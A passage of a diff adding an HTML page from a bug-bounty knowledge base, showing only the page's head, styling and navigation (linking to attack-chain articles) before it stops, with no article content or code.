@@ -1,0 +1,3536 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="A clean, practical knowledge base for bug bounty hunters and pentesters">
+      
+      
+      
+        <link rel="canonical" href="https://hackus-codex.online/chains/race-to-bypass/">
+      
+      
+        <link rel="prev" href="../prototype-pollution-to-rce/">
+      
+      
+        <link rel="next" href="../self-xss-escalation/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+    
+    
+      
+        <title>Race to Bypass - Hackus Codex</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+  
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+  
+  <style>:root{--md-admonition-icon--note:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M14%2010h5.5L14%204.5zM5%203h10l6%206v10a2%202%200%200%201-2%202H5a2%202%200%200%201-2-2V5c0-1.11.89-2%202-2m0%209v2h14v-2zm0%204v2h9v-2z%22/%3E%3C/svg%3E');--md-admonition-icon--tip:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M12%206a6%206%200%200%201%206%206c0%202.22-1.21%204.16-3%205.2V19a1%201%200%200%201-1%201h-4a1%201%200%200%201-1-1v-1.8c-1.79-1.04-3-2.98-3-5.2a6%206%200%200%201%206-6m2%2015v1a1%201%200%200%201-1%201h-2a1%201%200%200%201-1-1v-1zm6-10h3v2h-3zM1%2011h3v2H1zM13%201v3h-2V1zM4.92%203.5l2.13%202.14-1.42%201.41L3.5%204.93zm12.03%202.13%202.12-2.13%201.43%201.43-2.13%202.12z%22/%3E%3C/svg%3E');--md-admonition-icon--warning:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M13%2014h-2V9h2m0%209h-2v-2h2M1%2021h22L12%202z%22/%3E%3C/svg%3E');--md-admonition-icon--danger:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M17.66%2011.2c-.23-.3-.51-.56-.77-.82-.67-.6-1.43-1.03-2.07-1.66C13.33%207.26%2013%204.85%2013.95%203c-.95.23-1.78.75-2.49%201.32-2.59%202.08-3.61%205.75-2.39%208.9.04.1.08.2.08.33%200%20.22-.15.42-.35.5-.23.1-.47.04-.66-.12a.6.6%200%200%201-.14-.17c-1.13-1.43-1.31-3.48-.55-5.12C5.78%2010%204.87%2012.3%205%2014.47c.06.5.12%201%20.29%201.5.14.6.41%201.2.71%201.73%201.08%201.73%202.95%202.97%204.96%203.22%202.14.27%204.43-.12%206.07-1.6%201.83-1.66%202.47-4.32%201.53-6.6l-.13-.26c-.21-.46-.77-1.26-.77-1.26m-3.16%206.3c-.28.24-.74.5-1.1.6-1.12.4-2.24-.16-2.9-.82%201.19-.28%201.9-1.16%202.11-2.05.17-.8-.15-1.46-.28-2.23-.12-.74-.1-1.37.17-2.06.19.38.39.76.63%201.06.77%201%201.98%201.44%202.24%202.8.04.14.06.28.06.43.03.82-.33%201.72-.93%202.27%22/%3E%3C/svg%3E');--md-admonition-icon--bug:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M14%2012h-4v-2h4m0%206h-4v-2h4m6-6h-2.81a6%206%200%200%200-1.82-1.96L17%204.41%2015.59%203l-2.17%202.17a6%206%200%200%200-2.83%200L8.41%203%207%204.41l1.62%201.63C7.88%206.55%207.26%207.22%206.81%208H4v2h2.09c-.05.33-.09.66-.09%201v1H4v2h2v1c0%20.34.04.67.09%201H4v2h2.81c1.04%201.79%202.97%203%205.19%203s4.15-1.21%205.19-3H20v-2h-2.09c.05-.33.09-.66.09-1v-1h2v-2h-2v-1c0-.34-.04-.67-.09-1H20z%22/%3E%3C/svg%3E');--md-admonition-icon--example:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22m14.6%2016.6%204.6-4.6-4.6-4.6L16%206l6%206-6%206zm-5.2%200L4.8%2012l4.6-4.6L8%206l-6%206%206%206z%22/%3E%3C/svg%3E');--md-admonition-icon--quote:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M14%2017h3l2-4V7h-6v6h3M6%2017h3l2-4V7H5v6h3z%22/%3E%3C/svg%3E');}</style>
+
+
+
+  
+  
+    
+      
+      
+        
+      
+      
+    
+  
+    
+      
+      
+        
+      
+      
+    
+  
+    
+      
+      
+        
+      
+      
+    
+  
+    
+      
+      
+        
+      
+      
+    
+  
+    
+      
+      
+        
+      
+      
+    
+  
+    
+      
+      
+        
+      
+      
+    
+  
+    
+      
+      
+        
+      
+      
+    
+  
+    
+      
+      
+        
+      
+      
+    
+  
+  
+  <style>:root{.md-tag.md-tag--critical{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M17.66%2011.2c-.23-.3-.51-.56-.77-.82-.67-.6-1.43-1.03-2.07-1.66C13.33%207.26%2013%204.85%2013.95%203c-.95.23-1.78.75-2.49%201.32-2.59%202.08-3.61%205.75-2.39%208.9.04.1.08.2.08.33%200%20.22-.15.42-.35.5-.23.1-.47.04-.66-.12a.6.6%200%200%201-.14-.17c-1.13-1.43-1.31-3.48-.55-5.12C5.78%2010%204.87%2012.3%205%2014.47c.06.5.12%201%20.29%201.5.14.6.41%201.2.71%201.73%201.08%201.73%202.95%202.97%204.96%203.22%202.14.27%204.43-.12%206.07-1.6%201.83-1.66%202.47-4.32%201.53-6.6l-.13-.26c-.21-.46-.77-1.26-.77-1.26m-3.16%206.3c-.28.24-.74.5-1.1.6-1.12.4-2.24-.16-2.9-.82%201.19-.28%201.9-1.16%202.11-2.05.17-.8-.15-1.46-.28-2.23-.12-.74-.1-1.37.17-2.06.19.38.39.76.63%201.06.77%201%201.98%201.44%202.24%202.8.04.14.06.28.06.43.03.82-.33%201.72-.93%202.27%22/%3E%3C/svg%3E');}.md-tag.md-tag--high{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M13%2014h-2V9h2m0%209h-2v-2h2M1%2021h22L12%202z%22/%3E%3C/svg%3E');}.md-tag.md-tag--medium{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M13%2013h-2V7h2m0%2010h-2v-2h2M12%202A10%2010%200%200%200%202%2012a10%2010%200%200%200%2010%2010%2010%2010%200%200%200%2010-10A10%2010%200%200%200%2012%202%22/%3E%3C/svg%3E');}.md-tag.md-tag--low{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M13%209h-2V7h2m0%2010h-2v-6h2m-1-9A10%2010%200%200%200%202%2012a10%2010%200%200%200%2010%2010%2010%2010%200%200%200%2010-10A10%2010%200%200%200%2012%202%22/%3E%3C/svg%3E');}.md-tag.md-tag--server-side{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M4%201h16a1%201%200%200%201%201%201v4a1%201%200%200%201-1%201H4a1%201%200%200%201-1-1V2a1%201%200%200%201%201-1m0%208h16a1%201%200%200%201%201%201v4a1%201%200%200%201-1%201H4a1%201%200%200%201-1-1v-4a1%201%200%200%201%201-1m0%208h16a1%201%200%200%201%201%201v4a1%201%200%200%201-1%201H4a1%201%200%200%201-1-1v-4a1%201%200%200%201%201-1M9%205h1V3H9zm0%208h1v-2H9zm0%208h1v-2H9zM5%203v2h2V3zm0%208v2h2v-2zm0%208v2h2v-2z%22/%3E%3C/svg%3E');}.md-tag.md-tag--client-side{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M21%2016H3V4h18m0-2H3c-1.11%200-2%20.89-2%202v12a2%202%200%200%200%202%202h7v2H8v2h8v-2h-2v-2h7a2%202%200%200%200%202-2V4a2%202%200%200%200-2-2%22/%3E%3C/svg%3E');}.md-tag.md-tag--logic{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M21.33%2012.91c.09%201.55-.62%203.04-1.89%203.95l.77%201.49c.23.45.26.98.06%201.45-.19.47-.58.84-1.06%201l-.79.25a1.687%201.687%200%200%201-1.86-.55L14.44%2018c-.89-.15-1.73-.53-2.44-1.1-.5.15-1%20.23-1.5.23-.88%200-1.76-.27-2.5-.79-.53.16-1.07.23-1.62.22-.79.01-1.57-.15-2.3-.45a4.1%204.1%200%200%201-2.43-3.61c-.08-.72.04-1.45.35-2.11-.29-.75-.32-1.57-.07-2.33C2.3%207.11%203%206.32%203.87%205.82c.58-1.69%202.21-2.82%204-2.7%201.6-1.5%204.05-1.66%205.83-.37.42-.11.86-.17%201.3-.17%201.36-.03%202.65.57%203.5%201.64%202.04.53%203.5%202.35%203.58%204.47.05%201.11-.25%202.2-.86%203.13.07.36.11.72.11%201.09m-5-1.41c.57.07%201.02.5%201.02%201.07a1%201%200%200%201-1%201h-.63c-.32.9-.88%201.69-1.62%202.29.25.09.51.14.77.21%205.13-.07%204.53-3.2%204.53-3.25a2.59%202.59%200%200%200-2.69-2.49%201%201%200%200%201-1-1%201%201%200%200%201%201-1c1.23.03%202.41.49%203.33%201.3.05-.29.08-.59.08-.89-.06-1.24-.62-2.32-2.87-2.53-1.25-2.96-4.4-1.32-4.4-.4-.03.23.21.72.25.75a1%201%200%200%201%201%201c0%20.55-.45%201-1%201-.53-.02-1.03-.22-1.43-.56-.48.31-1.03.5-1.6.56-.57.05-1.04-.35-1.07-.9a.97.97%200%200%201%20.88-1.1c.16-.02.94-.14.94-.77%200-.66.25-1.29.68-1.79-.92-.25-1.91.08-2.91%201.29C6.75%205%206%205.25%205.45%207.2%204.5%207.67%204%208%203.78%209c1.08-.22%202.19-.13%203.22.25.5.19.78.75.59%201.29-.19.52-.77.78-1.29.59-.73-.32-1.55-.34-2.3-.06-.32.27-.32.83-.32%201.27%200%20.74.37%201.43%201%201.83.53.27%201.12.41%201.71.4q-.225-.39-.39-.81a1.038%201.038%200%200%201%201.96-.68c.4%201.14%201.42%201.92%202.62%202.05%201.37-.07%202.59-.88%203.19-2.13.23-1.38%201.34-1.5%202.56-1.5m2%207.47-.62-1.3-.71.16%201%201.25zm-4.65-8.61a1%201%200%200%200-.91-1.03c-.71-.04-1.4.2-1.93.67-.57.58-.87%201.38-.84%202.19a1%201%200%200%200%201%201c.57%200%201-.45%201-1%200-.27.07-.54.23-.76.12-.1.27-.15.43-.15.55.03%201.02-.38%201.02-.92%22/%3E%3C/svg%3E');}.md-tag.md-tag--infra{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M6.5%2020q-2.28%200-3.89-1.57Q1%2016.85%201%2014.58q0-1.95%201.17-3.48%201.18-1.53%203.08-1.95.63-2.3%202.5-3.72Q9.63%204%2012%204q2.93%200%204.96%202.04Q19%208.07%2019%2011q1.73.2%202.86%201.5%201.14%201.28%201.14%203%200%201.88-1.31%203.19T18.5%2020Z%22/%3E%3C/svg%3E');}}</style>
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/terminal.css">
+    
+      <link rel="stylesheet" href="../../stylesheets/cards.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="lime">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#race-condition-business-logic-bypass" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Hackus Codex" class="md-header__button md-logo" aria-label="Hackus Codex" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m15.8 18.5 6 1.6-.4 1.9-9.4-2.5L2.6 22l-.5-1.9 6-1.6L2 16.9l.5-1.9 9.4 2.5 9.4-2.5.5 1.9zM18 8c0 1.8-.8 3.3-2 4.4V15h-2v-2h-1v2h-2v-2h-1v2H8v-2.6C6.8 11.3 6 9.8 6 8a6 6 0 0 1 6-6 6 6 0 0 1 6 6m-7-.5c0-.8-.7-1.5-1.5-1.5S8 6.7 8 7.5 8.7 9 9.5 9 11 8.3 11 7.5m2 3.5-1-2-1 2zm3-3.5c0-.8-.7-1.5-1.5-1.5S13 6.7 13 7.5 13.7 9 14.5 9 16 8.3 16 7.5"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Hackus Codex
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Race to Bypass
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="lime"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="green"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../quick/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  🎯 Quick Ref
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../vulns/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  🔥 Vulnerabilities
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  ⛓️ Chains
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../frameworks/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  🛠️ Frameworks
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../tags/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  🏷️ Tags
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Hackus Codex" class="md-nav__button md-logo" aria-label="Hackus Codex" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m15.8 18.5 6 1.6-.4 1.9-9.4-2.5L2.6 22l-.5-1.9 6-1.6L2 16.9l.5-1.9 9.4 2.5 9.4-2.5.5 1.9zM18 8c0 1.8-.8 3.3-2 4.4V15h-2v-2h-1v2h-2v-2h-1v2H8v-2.6C6.8 11.3 6 9.8 6 8a6 6 0 0 1 6-6 6 6 0 0 1 6 6m-7-.5c0-.8-.7-1.5-1.5-1.5S8 6.7 8 7.5 8.7 9 9.5 9 11 8.3 11 7.5m2 3.5-1-2-1 2zm3-3.5c0-.8-.7-1.5-1.5-1.5S13 6.7 13 7.5 13.7 9 14.5 9 16 8.3 16 7.5"/></svg>
+
+    </a>
+    Hackus Codex
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../quick/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎯 Quick Ref
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../vulns/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔥 Vulnerabilities
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ⛓️ Chains
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4" id="__nav_4_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    ⛓️ Chains
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../xss-to-ato/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS to ATO
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../idor-to-ato/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IDOR to ATO
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssrf-to-rce/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF to RCE
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../oauth-to-ato/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OAuth to ATO
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cache-poison-to-xss/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cache to XSS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../xxe-to-ssrf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XXE to SSRF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sqli-to-rce/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQLi to RCE
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../prototype-pollution-to-rce/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Prototype Pollution to RCE
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
